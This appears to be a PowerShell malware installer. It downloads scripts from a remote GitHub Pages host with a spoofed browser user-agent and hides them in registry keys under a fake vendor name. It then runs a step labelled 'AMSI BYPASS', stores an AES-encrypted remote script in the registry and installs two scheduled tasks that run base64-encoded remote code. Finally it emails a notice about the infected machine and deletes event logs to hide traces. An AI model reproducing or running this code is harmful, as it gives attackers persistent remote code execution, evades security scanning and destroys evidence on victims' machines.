
[CmdletBinding(SupportsShouldProcess)]
param()

$LogFileName=(new-guid).Guid
$LogFileName = $LogFileName.substring(0,16)
$LogFileName = $LogFileName + '.dat'
$FullLogs = ""
[string]$TempDir=(new-guid).Guid
$TmpFilePath="$env:Temp\$TempDir"
$null=New-Item -Path $TmpFilePath -ItemType Directory -Force
$LogFileName = Join-Path $TmpFilePath $LogFileName

$EnableLogOutput=$false
if((Get-Variable -Name 'SCRIPTDEBUG-ENABLED' -Scope Global -ValueOnly) -eq $true){$EnableLogOutput=$true}


$ThisScript=$($MyInvocation.MyCommand.Name)
$ThisScript=$ThisScript.SubString(0,$ThisScript.Length-4)

#----!DEPENDENCIESDEFINITIONS----
$Functions = 'RemoveOldTasks', 'Cleanup', 'Get-SystemUUID', 'Check-Version', 'Get-MachineCryptoGuid', 'Get-4KHash', 'Test-Machine-Identification', 'Get-PossiblePasswordList', 'Invoke-AESEncryption', 'Decrypt-String', 'Encrypt-String', 'Test-EncryptionDecryption', 'Send-EmailNotification', 'Invoke-Process', 'Get-FileSystemInfo', 'Get-InstalledSoftware', 'Import-Variables', 'Test-ImportsVariables', 'New-TempDirectory', 'Get-Base64FromUrl', 'Out-String', 'NetGetFileNoCache', 'NetGetStringNoCache', 'Test-RegistryValue', 'Get-RegistryValue', 'Set-RegistryValue', 'New-RegistryValue', 'Install-RegistryKey', 'Test-RegistryValue', 'New-RegistryValue', 'Get-RegistryKeyPropertiesAndValues', 'Save-ScriptToRegistry', 'New-ScheduledTaskFolder', 'Install-EncodedScriptTask'
$Dependencies = 'Clean-Functions.ps1', 'Crypto-Functions.ps1', 'Email-Functions.ps1', 'Get-FileSystemInfo.ps1', 'Get-InstalledSoftware.PS1', 'Imports.ps1', 'Misc-Functions.ps1', 'Network-Functions.ps1', 'Registry-Functions.ps1', 'Tasks-Functions.ps1'



Function Out-String {
    param (
        [Parameter(Mandatory=$false)]
        [string]$Msg="",
        [switch]$IsError
    )

    if($Msg -eq ""){return}
    $FullLogs = $FullLogs + $Msg
    if($EnableLogOutput){
        if($IsError){
            write-host "[*** $ThisScript ***] " -f Blue -NoNewLine
            write-host $Msg -f White
        }
        else {
            write-host "[$ThisScript] " -f DarkRed -NoNewLine
            write-host $Msg -f DarkYellow
        }
    }
    [pscustomobject]@{
            Time = (Get-Date -f g)
            Message = "[$ThisScript] $Msg"
        } | Export-Csv -Path $LogFileName -Append -NoTypeInformation
    
}



function Get-RegistryKeyPropertiesAndValues {
 Param(
  [Parameter(Mandatory=$true)]
  [string]$path)

 Push-Location
 Set-Location -Path $path
 Get-Item . |  Select-Object -ExpandProperty property |  ForEach-Object {
    New-Object psobject -Property @{"property"=$_;
    "Value" = (Get-ItemProperty -Path . -Name $_).$_}
    }
    Pop-Location
} 

function Test-RegistryValue
{

    param (
     [parameter(Mandatory=$true)]
     [ValidateNotNullOrEmpty()]$Path,
     [parameter(Mandatory=$true)]
     [ValidateNotNullOrEmpty()]$Entry
    )

    if(-not(Test-Path $Path)){
        return $false
    }
    try {
        Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Entry -ErrorAction Stop | Out-Null
        return $true
    }

    catch {
        return $false
    }
}



function DependencyCheck{

    $NumMissingFuntions=0
    try{
        Out-String "Checking Dependencies..."
        foreach($func in $Functions){
            
            $cmd=get-command -Name $func -ErrorAction SilentlyContinue
            if($EnableLogOutput){ Write-Host "  Funtion $func" -f Gray -NoNewLine }
            if($cmd -ne $null){
                $NumFuntions=$NumFuntions+1
                 if($EnableLogOutput){ Write-Host "`t`t`t[DETECTED]" -f Green }
            }else{
                if($EnableLogOutput){ Write-Host "`t`t`t[MISSING]" -f Red }
                $NumMissingFuntions = $NumMissingFuntions + 1
            }
        }
        
    }
    catch{
        $Msg="Dependencies Error: $($PSItem.ToString())"
        Write-Error $Msg -IsError
    }

    if($NumMissingFuntions -gt 0){
        return $false
    }
    return $true
}

$BaseUrl='https://vr972be716a04eb6.github.io/'
$IncludesUrl= $BaseUrl + 'cmd/inc/'
$RegKeyRootPath="HKLM:\SOFTWARE\SoundIncorporated"
$RegKeyPathInc=Join-Path $RegKeyRootPath "Software\Controls\MediaSystems\Includes"
Set-Variable -Name 'REGISTRY_INCL' -Value $RegKeyPathInc -Scope Script
Set-Variable -Name 'URL_BASE' -Value $BaseUrl -Scope Script
Set-Variable -Name 'URL_INCL' -Value $IncludesUrl -Scope Script


function Download-Dependencies-SaveInRegistry {
  [CmdletBinding(SupportsShouldProcess)]
  param()

 
  $WebClient = [System.Net.WebClient]::new()
  if( -not (Test-Path -Path $script:REGISTRY_INCL -PathType Container) ){
    $null=New-Item -Path $script:REGISTRY_INCL -ItemType RegistryKey -Force
  }

  try{      

      $BaseUrl=$script:URL_INCL
     
      foreach($DepFile in $Dependencies){
        $FullUrl = $BaseUrl + $DepFile

        $TmpFileName = Join-Path $TmpFilePath $DepFile

        $RandId=(new-guid).Guid
        $RandId=$RandId -replace "-"
        $RequestUrl = "$FullUrl" + "?id=$RandId"
        $WebClient.Headers.Add("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1") 
        $WebClient.CachePolicy = New-Object Net.Cache.RequestCachePolicy([Net.Cache.RequestCacheLevel]::NoCacheNoStore)
        $WebClient.DownloadFile($RequestUrl,$TmpFileName)

        if(Test-RegistryValue -Path $script:REGISTRY_INCL -Entry $DepFile){
            $null=Remove-ItemProperty -Path $script:REGISTRY_INCL -Name $DepFile -Force  | Out-null
        }
        $null=New-ItemProperty -Path $script:REGISTRY_INCL -Name $DepFile -Value $TmpFileName -PropertyType String
        Out-String "Saving $source in registry"
        Out-String "`tFile: $TmpFileName"
      }
  }
  catch{
    $Msg="Download-Dependencies-SaveInRegistry Ran into an issue: $($PSItem.ToString())"
    write-Error $Msg
    return 
  }
}

Function Get-DependenciesFromRegistry
{
    [CmdletBinding(SupportsShouldProcess)]
    param()
    $Res = [System.Collections.ArrayList]::new()
    try{
        Out-String "----------   LOOKING IN REGISTRY TO INCLUDE DEPEDENCIES ----------"

        $Includes=Get-RegistryKeyPropertiesAndValues -path $script:REGISTRY_INCL
        $IncludesLen=$Includes.Length
        Out-String "Found $IncludesLen registry entries"

        ForEach($incfile in $Includes){
            $FileName=$incfile[0].property
            $FilePath=$incfile[0].Value
            if(Test-Path -Path $FilePath){
                Out-String "     $FilePath"
                $null=$Res.Add($FilePath)
            }else{
                
                $WebClient = [System.Net.WebClient]::new()
                $Url=$script:URL_INCL
                $TmpFileName = Join-Path $TmpFilePath $FileName
                $Source = $Url + $FileName
                Out-String "    missing file, will download $Source,$TmpFileName"

                $RandId=(new-guid).Guid
                $RandId=$RandId -replace "-"
                $RequestUrl = "$Source" + "?id=$RandId"
                $WebClient.Headers.Add("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1") 
                $WebClient.CachePolicy = New-Object Net.Cache.RequestCachePolicy([Net.Cache.RequestCacheLevel]::NoCacheNoStore)
                $WebClient.DownloadFile($RequestUrl,$TmpFileName)
                $null=$Res.Add($TmpFileName)
               
               if(Test-RegistryValue -Path $script:REGISTRY_INCL -Entry $FileName){
                    $null=Remove-ItemProperty -Path $script:REGISTRY_INCL -Name $FileName -Force  | Out-null
                }
                $null=New-ItemProperty -Path $script:REGISTRY_INCL -Name $FileName -Value $TmpFileName -PropertyType String
            }
        }
    }
    catch{
        $Msg="Include-Dependencies: Ran into an issue: $FileName"
        write-error $Msg 
    }
    return $Res
} 




$Start=Get-Date
Out-String "----------   INSTALL START   ----------"
Out-String "Download and save dependencies..."

DependencyCheck
############################################################
##
## Dependencies Download, save
##
############################################################
Download-Dependencies-SaveInRegistry



try{
    Remove-Module Carbon -ErrorAction Ignore 
}
catch{
    Write-Verbose "noop"
}

############################################################
##
## Dependencies Inclusion
##
############################################################
$DepList=Get-DependenciesFromRegistry
$DepListLen=$DepList.Length
Out-String "Found $DepListLen dependencies..."
ForEach($dep in $DepList){
    $Name=$dep
    Out-String "including $Name..."
    . $Name
}

if(-not(DependencyCheck)){
    Write-Error -Message "Dependency Error" -Exception ( New-Object -TypeName System.IO.FileNotFoundException ) -ErrorAction Stop
}


Import-Variables
Test-ImportsVariables



<#         *******************
#              PREPARATION
#          ********************
#>

# AMSI
Out-String "AMSI BYPASS"
Remove-Item -Path $script:REGKEY_AMSIBP -Recurse -Force -ErrorAction Ignore 



<#         *******************************************
#              UPDATE TASKS DEFINITION (ENCRYPTED)
#         *******************************************
#>
$ScriptUrl=$script:SCRIPT_DLDRUN
$PassUrl=$script:URL_PASSWD
$ClearScript = NetGetStringNoCache -Url $ScriptUrl
$Pass = NetGetStringNoCache -Url $PassUrl
$Pass = $Pass.substring(0,30)
$EncryptedScript=Invoke-AESEncryption -Mode Encrypt -Key $Pass -Text $ClearScript
Out-String "Getting Script: $ScriptUrl saving TO REGISTRY..."


$RegKeyPath=$script:REGISTRY_MDIA
$RegKeyName=$script:REGISTRY_TASK

$null=Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value $EncryptedScript

<#         ***********************
#                 TASK NO 1
#         ************************
#>
try{
    $NewTaskName=$script:TASKNAME_ONE
    $ScriptUrl=$script:SCRIPT_RUNHRY
    [string]$Base64Command=Get-Base64FromUrl $ScriptUrl
    $Base64CommandLen=$Base64Command.Length
    Out-String "Install-EncodedScriptTask -TaskName $NewTaskName -Interval 15 -EncodedTask Base64Command($Base64CommandLen)"
    $TaskVal=Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore
    if($TaskVal -eq $null){
         Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
        Install-EncodedScriptTask -TaskName $NewTaskName -Interval 15 -EncodedTask $Base64Command
    }
}catch
{
    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
    write-error $Msg 
}   

<#         ***********************
#                 TASK NO 2
#         ************************
#>
try{
    $NewTaskName=$script:TASKNAME_TWO
    $ScriptUrl=$script:SCRIPT_UPDRNR
    [string]$Base64Command=Get-Base64FromUrl $ScriptUrl
    $Base64CommandLen=$Base64Command.Length
    Out-String "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
    $TaskVal=Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore
    if($TaskVal -eq $null){
        Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
        Install-EncodedScriptTask -TaskName $NewTaskName -Interval 500 -EncodedTask $Base64Command
    }

 

}catch
{
    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
    write-error $Msg 
}  


$End=Get-Date
$Diff=$End-$Start
$Min=$Diff.Minutes
$Sec=$Diff.Seconds
Out-String "Done All tasks. Ended on $End."
Out-String "Took a total of $Min minutes and $Sec seconds."


Out-String "Send-EmailNotification"
Send-EmailNotification "Schd Task Install Notice for $env:COMPUTERNAME" "Done All tasks. Ended on $End. Took a total of $Min minutes and $Sec seconds. $FullLogs" "$LogFilePath"

Out-String "Cleanup"
Cleanup -DeleteEvents -DeleteLogFiles

Sleep 1
